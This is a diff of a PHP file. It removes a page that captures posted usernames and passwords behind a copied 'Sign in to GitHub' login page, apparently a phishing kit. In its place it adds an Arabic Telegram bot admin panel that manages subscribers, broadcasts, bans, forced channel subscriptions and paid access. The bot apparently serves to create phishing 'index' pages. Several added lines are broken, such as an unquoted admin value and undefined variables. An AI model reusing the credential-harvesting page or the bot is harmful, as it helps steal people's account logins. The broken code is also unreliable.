@@ -1,114 +1,615 @@
 <?php
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-$username = $_POST['login'];
-$password = $_POST['password'];
-$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
-$loginFolder = '';
+$admin = dddoip.serv00;
+$token = file_get_contents("token.txt");
+$brokweb = "https://two00050-3.onrender.com";
+#==================#
 
-// ابحث عن الملفات التي تطابق النمط الذي تريده
-foreach ($files as $file) {
-    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
-        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
-        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
+#==================#
+define('API_KEY', $token);
+function bot($method,$datas=[]){
+    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
+    $ch = curl_init();
+    curl_setopt($ch,CURLOPT_URL,$url);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
+    $res = curl_exec($ch);
+    if(curl_error($ch)){
+        var_dump(curl_error($ch));
+    }else{
+        return json_decode($res);
     }
 }
-include("../COUNTRY.php");
+function sendmessage($chat_id, $text){
+ bot('sendMessage',[
+ 'chat_id'=>$chat_id,
+ 'text'=>$text,
+ 'parse_mode'=>"MarkDown"
+ ]);
+} 
+ function sendphoto($chat_id, $photo, $caption){
+ bot('sendphoto',[
+ 'chat_id'=>$chat_id,
+ 'photo'=>$photo,
+ 'caption'=>$caption,
+ ]);
 }
+function sendsticker($chat_id,$sticker_id,$caption){
+    bot('sendsticker',[
+        'chat_id'=>$ChatId,
+        'sticker'=>$sticker_id,
+        'caption'=>$caption
+    ]);
+ } 
+//-//////
+$update = json_decode(file_get_contents('php://input'));
+$message = $update->message; 
+$chat_id = $message->chat->id;
+$text = $message->text;
+$chatid = $update->callback_query->message->chat->id;
+$data = $update->callback_query->data;
+$message_id = $update->callback_query->message->message_id;
+
+$chat_id2 = $update->callback_query->message->chat->id;
+$user_id = $message->from->id;
+$name = $message->from->first_name;
+$username = $message->from->username;
+// قراءة معرفات المستخدمين المخزنة في الملف وتحويلها إلى مصفوفة
+$u = explode("\n", file_get_contents("database/ID.txt"));
+
+// حساب عدد الأعضاء الحاليين
+$c = count($u) - 1;
+
+// التأكد من أن $update و $chat_id تم تعريفهما وأن $chat_id غير موجودة بالفعل في المصفوفة $u
+$ban = file_get_contents("database/ban.txt");
+$exb = explode("\n",$ban);
+
+
+
+    // إرسال رسالة إلى الإدمن عن المستخدم الجديد
+ 
+
+#===============
+mkdir("database");
+mkdir("database/$chat_id");
+#==========لوحه تحكم========#
+$id = $message->from->id;
+$text = $message->text;
+$chat_id = $message->chat->id;
+$user = $message->from->username;
+$name = $message->from->first_name;
+$sajad = file_get_contents("database/rembo.txt");
+$ch = file_get_contents("database/ch.txt");
+$tn = file_get_contents("database/tnb.txt");
+
+$bot = file_get_contents("database/bot.txt");
+
+$m = explode("\n",file_get_contents("database/ID.txt"));
+$m1 = count($m)-1;
+if($message and !in_array($id, $m)){
+file_put_contents("database/ID.txt", $id."\n",FILE_APPEND);
+ }
+if (isset($update) && !in_array($chat_id, $u)) {
+    // حفظ معرف المستخدم الجديد إلى الملف
+    file_put_contents("database/ID.txt", $chat_id . "\n", FILE_APPEND);
+if($text =="/start"and $tn =="on"and $id !=$admin){
+bot('sendmessage',[
+'chat_id'=>$admin,
+'text'=>
+"
+🔔 *تنبيه: مستخدم جديد انضم إلى البوت الخاص بك!*
+👨‍💼¦ اسمه » ️ [$name](tg://user?id=$id)
+🔱¦ معرفه »  ️[@$user](tg://user?id=$id)
+💳¦ ايديه » ️ [$id](tg://user?id=$id)
+📊 *عدد الأعضاء الكلي:* $c
+",
+'parse_mode'=>"MarkDown",
+]);
+}
+}
+if($text =='/start' and $id ==$admin){
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text' => "مرحبًا! إليك أوامرك: ⚡📮\n\n
+1. إدارة المشتركين والتحكم بهم.\n
+2. إرسال إذاعات ورسائل موجهة.\n
+3. ضبط إعدادات الاشتراك الإجباري.\n
+4. تفعيل أو تعطيل التنبيهات.\n
+5. إدارة حالة البوت ووضع الاشتراك.",
+'reply_markup' => json_encode([
+    'inline_keyboard' => [
+        [['text' => "المشتركين 👥", 'callback_data' => "m1"]],
+        [['text' => "إذاعة رسالة 📮", 'callback_data' => "send"], ['text' => "توجيه رسالة 🔄", 'callback_data' => "forward"]],
+        [['text' => "وضع اشتراك إجباري 💢", 'callback_data' => "ach"], ['text' => "حذف اشتراك إجباري 🔱", 'callback_data' => "dch"]],
+        [['text' => "تفعيل التنبيه ✔️", 'callback_data' => "ons"], ['text' => "تعطيل التنبيه ❎", 'callback_data' => "ofs"]],
+        [['text' => "فتح البوت ✅", 'callback_data' => "obot"], ['text' => "إيقاف البوت ❌", 'callback_data' => "ofbot"]],
+        [['text' => "وضع المدفوع 💰", 'callback_data' => "pro"], ['text' => "وضع المجاني 🆓", 'callback_data' => "frre"]],
+        [['text' => "اظافه عظو مدفوع 💰", 'callback_data' => "pro123"], ['text' => "ازاله عظو مدفوع 🆓", 'callback_data' => "frre123"]],
+        [['text' => "حظر عضو 🚫", 'callback_data' => "ban"], ['text' => "إلغاء حظر عضو ❌", 'callback_data' => "unban"]],
+    ]
+])
+]);
+
+}
+
+if($data =='back'){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2,
+'message_id'=>$update->callback_query->message->message_id,
+'text' => "مرحبًا! إليك أوامرك: ⚡📮\n\n
+1. إدارة المشتركين والتحكم بهم.\n
+2. إرسال إذاعات ورسائل موجهة.\n
+3. ضبط إعدادات الاشتراك الإجباري.\n
+4. تفعيل أو تعطيل التنبيهات.\n
+5. إدارة حالة البوت ووضع الاشتراك.",
+'reply_markup' => json_encode([
+    'inline_keyboard' => [
+        [['text' => "المشتركين 👥", 'callback_data' => "m1"]],
+        [['text' => "إذاعة رسالة 📮", 'callback_data' => "send"], ['text' => "توجيه رسالة 🔄", 'callback_data' => "forward"]],
+        [['text' => "وضع اشتراك إجباري 💢", 'callback_data' => "ach"], ['text' => "حذف اشتراك إجباري 🔱", 'callback_data' => "dch"]],
+        [['text' => "تفعيل التنبيه ✔️", 'callback_data' => "ons"], ['text' => "تعطيل التنبيه ❎", 'callback_data' => "ofs"]],
+        [['text' => "فتح البوت ✅", 'callback_data' => "obot"], ['text' => "إيقاف البوت ❌", 'callback_data' => "ofbot"]],
+        [['text' => "وضع المدفوع 💰", 'callback_data' => "pro"], ['text' => "وضع المجاني 🆓", 'callback_data' => "frre"]],
+        [['text' => "اظافه عظو مدفوع 💰", 'callback_data' => "pro123"], ['text' => "ازاله عظو مدفوع 🆓", 'callback_data' => "frre123"]],
+        [['text' => "حظر عضو 🚫", 'callback_data' => "ban"], ['text' => "إلغاء حظر عضو ❌", 'callback_data' => "unban"]],
+    ]
+])
+]);
+
+unlink("database/rembo.txt");
+}
+if($data =="unban"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"حسنا عزيزي ارسل ايدي العضو لالغاء حظره🔱", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/$token/rembo.txt","unban");
+}
+if($text and $sajad =="unban" and $id ==$admin){
+$bn = str_replace($text,'',$ban);
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"تم الغاء حظر العضور بنجاح✅",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/$token/ban.txt",$bn);
+unlink("database/$token/rembo.txt");
+bot('SendMessage',[
+'chat_id'=>$text,
+'text'=>"تم الغاء حظرك من البوت🤩",
+]);
+}
+if($data =="ban"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"حسنا عزيزي ارسل ايدي العضو لاحظره🤩", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/rembo.txt","ban");
+}
+
+if($text and $sajad =="ban" and $id ==$admin){
+file_put_contents("database/ban.txt",$text."\n",FILE_APPEND);
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"تم حظر العضور بنجاح✅",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+bot('SendMessage',[
+'chat_id'=>$text,
+'text'=>"تم حظرك من قبل المطور لايمكنك استخدام البوت😒",
+]);
+}
+
+if($data =="ofbot"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"تم اغلاق البوت✅", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"عودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/bot1.txt","off");
+}
+$obot = file_get_contents("database/bot1.txt");
+if($data =="obot"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"تم فتح البوت بنجاح✅",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"عودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+unlink("database/bot1.txt");
+}
+if($data =="send"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"حسنا عزيزي ارسل رسالتك📮", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/rembo.txt","send");
+} 
+if($text and $sajad == "send" and $id == $admin){
+bot("sendmessage",[
+"chat_id"=>$chat_id,
+"text"=>'-تم النشر بنجاح✔️',
+ 'reply_markup'=>json_encode([ 
+      'inline_keyboard'=>[
+[['text'=>'العوده🔙' ,'callback_data'=>"back"]],
+]])
+]);
+for($i=0;$i<count($m); $i++){
+bot('sendMessage', [
+'chat_id'=>$m[$i],
+'text'=>$text
+]);
+unlink("database/rembo.txt");
+}
+}
+if($data =="forward"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"حسنا عزيزي قم بتوجيه الرسالة✅", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/rembo.txt","forward");
+} 
+if($text and $sajad == "forward" and $id == $admin){
+bot("sendmessage",[
+"chat_id"=>$chat_id,
+"text"=>'تم التوجيه بنجاح🔰',
+ 'reply_markup'=>json_encode([ 
+      'inline_keyboard'=>[
+[['text'=>'العوده🔙' ,'callback_data'=>"back"]],
+]])
+]);
+for($i=0;$i<count($m); $i++){
+bot('forwardMessage', [
+'chat_id'=>$m[$i],
+'from_chat_id'=>$id,
+'message_id'=>$message->message_id
+]);
+unlink("database/rembo.txt");
+}
+}
+
+if($data =="dch"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"ارسل معرف القناه لازالتها من الاشتراك الاجباري", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/rembo.txt","dch");
+}
+if($text and $sajad =="dch" and $id ==$admin){
+$botn = str_replace($text,'',$bot);
+file_put_contents("database/bot.txt","$botn");
+unlink("database/rembo.txt");
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"تم مسح القناه من الاشتراك الاجباري",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+}
+if($data == "m1"){
+    bot('answercallbackquery',[
+        'callback_query_id'=>$update->callback_query->id,
+        'text'=>"
+عدد المشترڪين هو » $m1 «
+        ",
+        'show_alert'=>true,
+]);
+}
+#========القسم مدفوع =======#
+if($data =="pro123"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"قم بارسال ايدي الشخص مراد اظافته بقسم مدفوع", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/rembo.txt","pro123");
+}
+if($text and $sajad =="pro123" and $id ==$admin){
+file_put_contents("database/vip123.txt",$text."\n",FILE_APPEND);
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"تم اظافته في وضع مدفوع",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+unlink("database/rembo.txt");
+}
+#================
+if($data =="frre123"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"ارسل ايدي شخص مراد ازالته من الاشتراك مدفوع", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/rembo.txt","frre123");
+}
+if($text and $sajad =="frre123" and $id ==$admin){
+$botn = str_replace($text,'',$bot);
+file_put_contents("database/vip123.txt","$botn");
+unlink("database/rembo.txt");
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"تم ازالته من الاشتراك مدفوع",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+}
+#================#
+if($data =="ach"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"حسنا عزيزي ارسل معرف قناتك 📮", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"الغاء الامر❎",'callback_data'=>"back"]],
+]
+])
+]);
+file_put_contents("database/rembo.txt","ch");
+}
+if($text and $sajad =="ch" and $id ==$admin){
+file_put_contents("database/bot.txt",$text."\n",FILE_APPEND);
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"تم وضع اشتراك اجباري😁",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+unlink("database/rembo.txt");
+}
+#================
+
+#=°°°====°°
+if($data =="ofs"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"
+تم تعطيل التنبيه بنجاح✅
+", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+unlink("database/tnb.txt");
+} 
+
+if($message and in_array($id, $exb)){
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"انت محظور من قبل المطور لايمكنك استخدام البوت📛",
+]);return false;}
+
+if($message and $obot =="off" and $id !=$admin){
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"بوت متوقف حاليا لاغراض خاصه 🚨🚧",
+]);return false;}
+#========مدفوع=======#
+if($data =="frre"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"
+تم جعل البوت بوضع المجاني 😊
+", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+unlink("database/vip.txt");
+} 
+if($data =="pro"){
+bot('editmessagetext',[
+'chat_id'=>$chat_id2, 
+'message_id'=>$update->callback_query->message->message_id,
+'text'=>"
+تم جعل البوت بوضع المدفوع 💼
+", 
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"العودة🔙",'callback_data'=>"back"]],
+]
+])
+]);
+   file_put_contents("database/vip.txt", "on");
+} 
+
+
+$vip = file_get_contents("database/vip.txt");
+$vip123 = file_get_contents("database/vip123.txt");
+$vip2 = explode("\n", $vip123);
+
+if ($vip == "on" and !in_array($id, $vip2)) {
+bot('sendmessage',[
+'chat_id'=>$chat_id,
+'text'=>"مرحبًا بكم! 🌟
+
+للاستفادة الكاملة من جميع ميزات وخدمات بوتنا المتقدمة، يُرجى تفعيل البوت من خلال شراء الاشتراك. ⚙️✨
+
+نحن نعمل بجد لضمان تقديم تجربة فريدة ومميزة لكم. 🚀
+
+شكراً لثقتكم بنا. 😊",
+'reply_markup'=>json_encode([
+'inline_keyboard'=>[
+[['text'=>"شراء الاشتراك",'url'=>"tg://user?id=$admin"]],
+]
+])
+]);return false;}
+#===============
+
+$channels = file("database/bot.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+
+// دالة لتسجيل الأخطاء
+function logError($message) {
+    file_put_contents('error_log.txt', $message . PHP_EOL, FILE_APPEND);
+}
+
+// الدالة للتحقق من اشتراك المستخدم في القناة
+function isUserSubscribed($userId, $channel, $token) {
+    $url = "https://api.telegram.org/bot$token/getChatMember?chat_id=$channel&user_id=$userId";
+    $result = file_get_contents($url);
+    $result = json_decode($result, true);
+
+    if (!$result) {
+        logError("Failed to fetch chat member info: " . json_last_error_msg());
+        return false;
+    }
+
+    if ($result['ok'] && ($result['result']['status'] == 'member' || $result['result']['status'] == 'administrator' || $result['result']['status'] == 'creator')) {
+        return true;
+    }
+    return false;
+}
+
+// الدالة لجلب اسم القناة
+function getChannelName($channel, $token) {
+    $url = "https://api.telegram.org/bot$token/getChat?chat_id=$channel";
+    $result = file_get_contents($url);
+    $result = json_decode($result, true);
+
+    if (!$result) {
+        logError("Failed to fetch chat info: " . json_last_error_msg());
+        return $channel;
+    }
+
+    if ($result['ok']) {
+        return $result['result']['title'];
+    }
+    return $channel; // ارجاع المعرف إذا لم ينجح الحصول على الاسم
+}
+
+// استقبال الطلبات الواردة من المستخدمين
+$input = file_get_contents('php://input');
+$update = json_decode($input, true);
+
+if (isset($update['message'])) {
+    $chatId = $update['message']['chat']['id'];
+    $userId = $update['message']['from']['id'];
+    $firstName = $update['message']['from']['first_name'];
+
+    // تحقق من اشتراك المستخدم في جميع القنوات
+    $notSubscribedChannels = [];
+    foreach ($channels as $channel) {
+        if (!isUserSubscribed($userId, $channel, $token)) {
+            $notSubscribedChannels[] = $channel;
+        }
+    }
+
+    // إعداد رسالة الرد
+    if (!empty($notSubscribedChannels)) {
+        $message = "
+🚀🎨 مرحباً بك في عالم إنشاء وإدارة الأندكسات 🎨🚀
+
+📌 تنبيه: الاشتراك الإجباري 📌
+
+🔐 لضمان أفضل تجربة واستخدام كامل لميزات البوت، يُرجى الاشتراك في القنوات التالية:
+
+🌟📈 استعد للانطلاق في رحلة تفاعلية مذهلة! 📈🌟
+
+";
+
+        $keyboard = [
+            'inline_keyboard' => []
+        ];
+
+        foreach ($notSubscribedChannels as $channel) {
+            $channelName = getChannelName($channel, $token);
+            // إزالة @ من معرف القناة إذا كان موجوداً
+            $cleanChannel = ltrim($channel, '@');
+            $keyboard['inline_keyboard'][] = [['text' => "اشترك في $channelName", 'url' => "https://t.me/$cleanChannel"]];
+            $message .= "$channelName\n";
+        }
+
+        $message .= "\n📢 بعد إتمام الاشتراك، قم بإرسال رسالة \"/start\" للمتابعة واستغلال جميع خدمات البوت.\n\n💬 نتمنى لك تجربة رائعة ومليئة بالتفاعل! 💬";
+
+        $replyMarkup = '&reply_markup=' . json_encode($keyboard);
+        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chatId&text=" . urlencode($message) . $replyMarkup);
+
+        // إنهاء التنفيذ إذا لم يكن المستخدم مشتركًا في جميع القنوات
+        return false;
+    } else {
+        // تابع بتنفيذ الخدمات هنا
+    }
+}
+
+#================
+include("index2.php");
+
 ?>
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-  <link rel="dns-prefetch" href="https://github.githubassets.com">
-  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
-  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
-  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
-
-
-
-  <link crossorigin="anonymous" media="all" integrity="sha512-k9NM/a2xYY6wCRcWG7f3ROm4X5CJNikViGX0N8YIxs6sUYAe/j08/RSHXr3fA9wLIy87AMFCgXm6jbvhZhIXWw==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-93d34cfdadb1618eb00917161bb7f744.css" />
-  <link crossorigin="anonymous" media="all" integrity="sha512-ZUf6K+vQqMY+RhVzaRmCy2ePbSZad4TkaGRbd6v5gFt6f9Q/nqjDkBDjQgXNmZw7J9mcYxlsE4fhRw7CTluRow==" rel="stylesheet" href="https://github.githubassets.com/assets/site-6547fa2bebd0a8c63e461573691982cb.css" />
-    <link crossorigin="anonymous" media="all" integrity="sha512-mm2SigzEudA9xS8nyiKvpPVLuATFJopEhsZReSWJTnUk/C6N2PmCkm3AltG5pf405Lxuqwah2aQ7rCEf+Rjbiw==" rel="stylesheet" href="https://github.githubassets.com/assets/behaviors-9a6d928a0cc4b9d03dc52f27ca22afa4.css" />
-    
-    
-    
-    <link crossorigin="anonymous" media="all" integrity="sha512-ADxBGP+/Ejuf3hdfXt1DPBnGrlQ47QqWJG2/uzyeofvKQGbkHG8l5dAmbOThfWzViBmMF+vy43i5TLs2M+J+4g==" rel="stylesheet" href="https://github.githubassets.com/assets/github-003c4118ffbf123b9fde175f5edd433c.css" />
-
-  <script crossorigin="anonymous" defer="defer" integrity="sha512-8K2vvwbW+6H27Nad5ydg8PA2/aMD/LKq+EiK9s0U0hhVZxCI2tWBsYk9beAtisRw2j+Or5k2/F+6dk02nmj/PA==" type="application/javascript" src="https://github.githubassets.com/assets/environment-f0adafbf.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-Of+WG2CISim899I88sYG7d/75B6gHRWbUDvUOJDh52ZKHoHClE8JQ4nZbvOrvIVTGKCUe68JogcDBUMVtQ7F8w==" type="application/javascript" src="https://github.githubassets.com/assets/chunk-frameworks-39ff961b.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-7GvK4gfpB9Ztz8H6JMSvF2zkjlAfbaRjfl7n1VtRpOc7huXjL3iGa8FuQiFTvdPX1fd8IYbNtXZoEDZa3RVOrQ==" type="application/javascript" src="https://github.githubassets.com/assets/chunk-vendor-ec6bcae2.js"></script>
-  
-  <script crossorigin="anonymous" defer="defer" integrity="sha512-LrlbFtVuiWoRKQh9cFzkYpcKwheTNTA3TrW7JLVCmEXKXR12EaKZsxRyACxZoBxeHvaak562K8ShalgfBhmhZw==" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-2eb95b16.js"></script>
-  
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-xDmMfbDOi7C1qDeTcUUIjKfOAG5qhfSNSHRf7wT0crqnTCqtHlO1jBZmRSpjbpn4RyitzX75K0wQ/dpHqO/gAg==" type="application/javascript" data-module-id="./chunk-contributions-spider-graph.js" data-src="https://github.githubassets.com/assets/chunk-contributions-spider-graph-c4398c7d.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-obMR8mPKx8OvqRe34LgnUcxeJ1qujiA4ND3H6UX13ExMlA/WfHLjEzXRmgGRcRvN/8J1nzc+Z+jgz/PLTFy6zg==" type="application/javascript" data-module-id="./chunk-drag-drop.js" data-src="https://github.githubassets.com/assets/chunk-drag-drop-a1b311f2.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-TGnbT/6B5dxVwEk7iOlwSY9mfqhfq8m05ec+KjdlfEwoieq73iBeyidClQUSmFa2snukwzF9peY8c7FJf9FARA==" type="application/javascript" data-module-id="./chunk-emoji-picker-element.js" data-src="https://github.githubassets.com/assets/chunk-emoji-picker-element-4c69db4f.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-NwYkwzxETzKUYRXumHDsBIuggkh86KmJ1WrwWZW5wTvVPf047+wOmOHI5b4D65bfdtd3WbXJ7k+3ZWoxpIaqcA==" type="application/javascript" data-module-id="./chunk-insights-graph.js" data-src="https://github.githubassets.com/assets/chunk-insights-graph-370624c3.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-o7Wgi+lb9ce+9dvjWvB30ar51Bw0wcGhFZfQIzNGZfJ/7GZwYxVCsqgA4Q2o8yRq1QDUL1G1NxR0/3o9FoQ9JQ==" type="application/javascript" data-module-id="./chunk-jump-to.js" data-src="https://github.githubassets.com/assets/chunk-jump-to-a3b5a08b.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-tcH4xCRuMBAh1PruDaiwGnRIbHlF6bGLhxyCQ16uqok1cV5QFMguVPWJtN9KI0jGQOgN+Pha3+uOUXhXdfK/qw==" type="application/javascript" data-module-id="./chunk-profile-pins-element.js" data-src="https://github.githubassets.com/assets/chunk-profile-pins-element-b5c1f8c4.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-E+H+wAtjiqutBvn2cnXzDIvmasIhYiS7i7JzOfFUwo+Ej8zT54OrJtP//RhwixnypgOpCF4JvqzYy6zOtORDmg==" type="application/javascript" data-module-id="./chunk-runner-groups.js" data-src="https://github.githubassets.com/assets/chunk-runner-groups-13e1fec0.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-U+Pp1bYuA3fRqhike5Go//O/vsExaZLz00lrIby+rZ88yf03nQHz3wLZR9paWkakpD7TH5nS6AUpabCc7OFWpg==" type="application/javascript" data-module-id="./chunk-sortable-behavior.js" data-src="https://github.githubassets.com/assets/chunk-sortable-behavior-53e3e9d5.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-QBwrFY4kzAVN0nZmTYJLeEhi5bQ+42rE8h1g384XeZb7n62BykcUICACtaDQ473aIrRf38RSR7WDfNEIVuSlTA==" type="application/javascript" data-module-id="./chunk-tweetsodium.js" data-src="https://github.githubassets.com/assets/chunk-tweetsodium-401c2b15.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-su8FOuJFv0H16y8vmT+N3HiFpDQnHKiLz/UEdGxlCfgwnKBy202gaBmkcBpqXigRg+A8pMDXcSPIWSEW+IIKvQ==" type="application/javascript" data-module-id="./chunk-user-status-submit.js" data-src="https://github.githubassets.com/assets/chunk-user-status-submit-b2ef053a.js"></script>
-    <script crossorigin="anonymous" defer="defer" integrity="sha512-qFsShJX3EkHdcQq11CLfRk444sM6/0OBXB8eTN3FZl70HSy6jUPI2M9H6/wNWDwOR+LLU/JE55Y2kl1CK1QioQ==" type="application/javascript" src="https://github.githubassets.com/assets/unsupported-a85b1284.js"></script>
-
-  <script crossorigin="anonymous" defer="defer" integrity="sha512-rvJsuqEABlg0AZgt+K7Uvy9sM1ufX1eaMJ++LgsHFD9YtbTd3Xk9zS4phxmjuxNhyDg4NEtWsdExEwPbehgn9A==" type="application/javascript" src="https://github.githubassets.com/assets/settings-aef26cba.js"></script>
-<script crossorigin="anonymous" defer="defer" integrity="sha512-RQhP6glI7eiTPchtQPPLQoeoFe3ehP5TvUen/f0960jJHf6hYRef+W0G5jNmdrLmSZ5YKkvo1yFmI2wKjnWWJQ==" type="application/javascript" src="https://github.githubassets.com/assets/sessions-45084fea.js"></script>
-
-  <meta name="viewport" content="width=device-width">
-  
-  <title>Sign in to GitHub · GitHub</title>
-    <meta name="description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
-    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
-  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
-  <meta property="fb:app_id" content="1401488693436528">
-  
-    <meta property="og:url" content="https://github.com">
-    <meta property="og:site_name" content="GitHub">
-    <meta property="og:title" content="Build software better, together">
-    <meta property="og:description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
-    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="1200">
-    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-mark.png">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="620">
-    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-octocat.png">
-    <meta property="og:image:type" content="image/png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="620">
-
-    <meta property="twitter:site" content="github">
-    <meta property="twitter:site:id" content="13334762">
-    <meta property="twitter:creator" content="github">
-    <meta property="twitter:creator:id" content="13334762">
-    <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:title" content="GitHub">
-    <meta property="twitter:description" content="GitHub is where people build software. More than 56 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
-    <meta property="twitter:image:src" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
-    <meta property="twitter:image:width" content="1200">
-    <meta property="twitter:image:height" content="1200">
-
-
-
-    
-
-  <link rel="assets" href="https://github.githubassets.com/">
-  
-
